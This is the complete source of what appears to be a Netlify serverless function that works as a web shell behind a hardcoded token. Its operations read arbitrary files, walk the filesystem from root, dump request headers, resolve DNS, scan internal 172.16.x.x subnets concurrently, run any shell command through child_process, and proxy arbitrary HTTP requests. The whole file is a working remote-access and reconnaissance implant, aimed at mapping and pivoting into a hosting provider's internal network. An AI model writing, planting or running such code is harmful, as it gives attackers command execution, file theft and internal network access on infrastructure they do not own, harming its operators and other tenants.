const TOKEN = "nfbb-tk-5e385c2b00f28f34fde07fbdf8054160";
const json = (code: number, body: unknown) => new Response(JSON.stringify(body, null, 1), { status: code, headers: { "content-type": "application/json" } });

export default async (req: Request) => {
  if (req.method !== "POST") return json(405, { err: "POST only" });
  let m: any;
  try { m = await req.json(); } catch { return json(400, { err: "bad json" }); }
  if (m.token !== TOKEN) return json(401, { err: "no" });
  const fs = await import("node:fs");
  try {
    switch (m.op) {
      case "headers":
        return json(200, { headers: Object.fromEntries(req.headers), url: req.url, context: (globalThis as any).Netlify?.context ? "yes" : "no" });
      case "read":
        return json(200, { data: fs.readFileSync(m.path, "utf8").slice(0, m.max || 262144) });
      case "walk": {
        const out: string[] = [];
        const walk = (p: string, d: number) => {
          if (d > (m.depth || 3) || out.length > (m.limit || 2000)) return;
          let es: string[];
          try { es = fs.readdirSync(p); } catch { return; }
          for (const e of es) { out.push(p + "/" + e); try { if (fs.statSync(p + "/" + e).isDirectory()) walk(p + "/" + e, d + 1); } catch {} }
        };
        walk(m.path || "/", 0);
        return json(200, { files: out });
      }
      case "dns": {
        const dns = await import("node:dns/promises");
        return json(200, { addrs: await dns.resolve(m.host, m.rr || "A").catch((e: any) => [{ err: e.code }]) });
      }
      case "scan": {
        // concurrent HTTP reachability probes across internal space
        const hosts: string[] = [];
        const c = m.cidr || "172.16";
        const port = m.port || 9339;
        const path = m.path || "/";
        const subnets = m.subnets || [1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20];
        const last = m.last || [1, 2, 3, 70];
        for (const b of subnets) for (const d of last) hosts.push(`http://${c}.${b}.${d}:${port}${path}`);
        for (const h of (m.extra || [])) hosts.push(h.startsWith("http") ? h : `http://${h}:${port}${path}`);
        const tmo = m.timeout || 2500;
        const probe = async (u: string) => {
          const ac = new AbortController();
          const t = setTimeout(() => ac.abort(), tmo);
          const t0 = Date.now();
          try {
            const r = await fetch(u, { signal: ac.signal, redirect: "manual" });
            const body = r.status ? (await r.text().catch(() => "")).slice(0, 200) : "";
            return { u, ms: Date.now() - t0, status: r.status, body };
          } catch (e: any) {
            const msg = String(e);
            return { u, ms: Date.now() - t0, refused: msg.includes("refused") || msg.includes("reset"), timeout: msg.includes("abort") || msg.includes("timed out") };
          } finally { clearTimeout(t); }
        };
        const CONC = m.conc || 12;
        const results = [];
        for (let i = 0; i < hosts.length; i += CONC) {
          results.push(...await Promise.all(hosts.slice(i, i + CONC).map(probe)));
        }
        return json(200, { from: "172.16.14.37-class", n: results.length,
          hits: results.filter((r: any) => r.status), refused: results.filter((r: any) => r.refused).map((r: any) => r.u) });
      }
      case "exec": {
        const cp = await import("node:child_process");
        const { promisify } = await import("node:util");
        const r = await promisify(cp.exec)(m.cmd, { timeout: m.timeout || 10000, maxBuffer: 8 * 1024 * 1024 });
        return json(200, { stdout: r.stdout, stderr: r.stderr });
      }
      case "fetch": {
        const r = await fetch(m.url, { method: m.method || "GET", headers: m.headers || {}, body: m.body, redirect: m.redirect || "manual" });
        const t = await r.text();
        return json(200, { status: r.status, headers: Object.fromEntries(r.headers), body: t.slice(0, m.max || 65536) });
      }
      default: return json(400, { err: "op?" });
    }
  } catch (e) { return json(500, { err: String(e) }); }
};
